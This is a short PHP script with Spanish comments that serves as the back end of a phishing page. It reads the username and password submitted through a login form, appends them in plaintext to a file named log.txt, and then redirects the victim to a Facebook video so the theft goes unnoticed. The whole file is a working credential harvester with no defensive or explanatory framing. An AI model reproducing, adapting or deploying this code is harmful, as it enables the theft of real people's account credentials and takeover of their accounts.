<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Abrir el archivo log.txt en modo append
    $file = fopen('log.txt', 'a');

    // Escribir la información del usuario en el archivo log.txt
    fwrite($file, "Usuario: $username\nContraseña: $password\n\n");

    // Cerrar el archivo log.txt
    fclose($file);

    // Redirigir al usuario a la página de Facebook
    header('Location: https://www.facebook.com/javierhumor/videos/1234013834188186/?app=fbl');
    exit;
}
?>
